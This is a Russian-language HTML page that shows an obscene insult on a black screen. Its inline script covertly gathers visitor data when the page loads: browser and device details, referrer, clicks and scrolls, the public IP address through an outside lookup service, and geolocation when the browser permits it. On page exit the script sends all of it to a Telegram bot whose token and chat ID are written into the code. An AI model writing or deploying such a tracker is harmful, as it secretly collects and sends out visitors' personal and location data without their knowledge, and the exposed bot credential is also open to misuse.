<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centered Text</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden; /* Отключить прокрутку */
            user-select: none; /* Запретить выделение текста */
        }

        .centered-text {
            font-size: 3rem; /* Размер текста */
            font-weight: bold; /* Жирный шрифт */
            text-transform: uppercase; /* Капсом */
            font-family: Arial, sans-serif; /* Простой шрифт */
        }

        body, html {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="centered-text">ИДИ НА ХУЙ</div>

    <script>
        // Функция для отправки информации о пользователе в Telegram
        function sendUserInfo() {
            const userInfo = {
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                referrer: document.referrer,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                historyLength: window.history.length,
                errorLog: [],
                userSettings: {},
                viewportSize: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                interactions: {
                    clicks: 0,
                    scrolls: 0
                },
                loadTime: 0,
                timeOnPage: 0,
                pageLoadTime: 0,
                geolocation: null,
                ipAddress: null, // будет получен от сервера
                depthOfView: 0
            };

            // Получение координат пользователя
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    userInfo.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                }, () => {
                    userInfo.geolocation = 'Geolocation denied';
                });
            }

            // Начинаем отсчитывать время на странице
            const startTime = Date.now();
            window.addEventListener('load', () => {
                userInfo.pageLoadTime = Math.floor(performance.now());
                userInfo.loadTime = Math.floor((Date.now() - startTime) / 1000); // время в секундах
            });

            // Слушаем события взаимодействия
            document.addEventListener('click', () => userInfo.interactions.clicks++);
            document.addEventListener('scroll', () => userInfo.interactions.scrolls++);

            // Отправляем данные при уходе со страницы
            window.addEventListener('beforeunload', () => {
                userInfo.timeOnPage = Math.floor((Date.now() - startTime) / 1000); // время на странице
                userInfo.depthOfView = window.history.length; // фиксируем количество просмотренных страниц
                sendDataToTelegram(userInfo);
            });

            // Получение IP-адреса (используйте ваш серверный API для получения)
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userInfo.ipAddress = data.ip; // сохраняем IP-адрес
                })
                .catch(err => console.error('Ошибка получения IP:', err));
        }

        // Функция отправки данных в Telegram
        function sendDataToTelegram(userInfo) {
            const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
            const chatId = '954053674'; // ID чата для отправки
            const message = `
                Новый визит на сайт!
                User Agent: ${userInfo.userAgent}
                Timestamp: ${userInfo.timestamp}
                Screen Width: ${userInfo.screenWidth}px
                Screen Height: ${userInfo.screenHeight}px
                Inner Width: ${userInfo.innerWidth}px
                Inner Height: ${userInfo.innerHeight}px
                Referrer: ${userInfo.referrer}
                Time on Page: ${userInfo.timeOnPage} сек.
                Page Load Time: ${userInfo.pageLoadTime} мс
                Geolocation: ${userInfo.geolocation ? `Lat: ${userInfo.geolocation.latitude}, Lon: ${userInfo.geolocation.longitude}` : 'Geolocation not available'}
                IP Address: ${userInfo.ipAddress}
                Platform: ${userInfo.platform}
                Language: ${userInfo.language}
                Cookies Enabled: ${userInfo.cookiesEnabled}
                Connection Type: ${userInfo.connectionType}
                History Length: ${userInfo.historyLength}
                Clicks: ${userInfo.interactions.clicks}
                Scrolls: ${userInfo.interactions.scrolls}
                Depth of View: ${userInfo.depthOfView}
            `;

            // Отправка POST-запроса на API Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Ошибка при отправке сообщения:', response.statusText);
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
            });
        }

        // Отправить информацию при загрузке страницы
        window.onload = sendUserInfo;
    </script>
</body>
</html>
